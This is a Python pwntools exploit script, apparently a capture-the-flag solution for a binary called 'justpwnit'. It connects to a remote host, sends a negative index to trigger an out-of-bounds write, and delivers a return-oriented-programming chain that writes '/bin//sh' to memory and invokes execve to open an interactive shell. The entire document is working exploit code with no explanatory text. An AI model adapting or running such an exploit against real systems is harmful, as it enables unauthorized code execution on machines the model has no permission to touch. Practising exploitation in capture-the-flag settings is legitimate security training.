from pwn import * 

# p = process('justpwnit')
p = remote('168.119.108.148', 11010)

syscall = 0x4013e9
pop_rax = 0x401001
pop_rdi = 0x401b0d
mov_rax_rsi = 0x406c32
pop_rsi = 0x4019a3
pop_rdx = 0x403d23

writable = 0x40c250 

payload = b'A' * 0x8
payload += p64(pop_rax)
payload += p64(writable)
payload += p64(pop_rsi)
payload += b'/bin//sh'
payload += p64(mov_rax_rsi)

payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(writable)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

p.sendlineafter(b'Index: ', b'-2')
p.sendlineafter(b'Data: ', payload)

p.interactive()
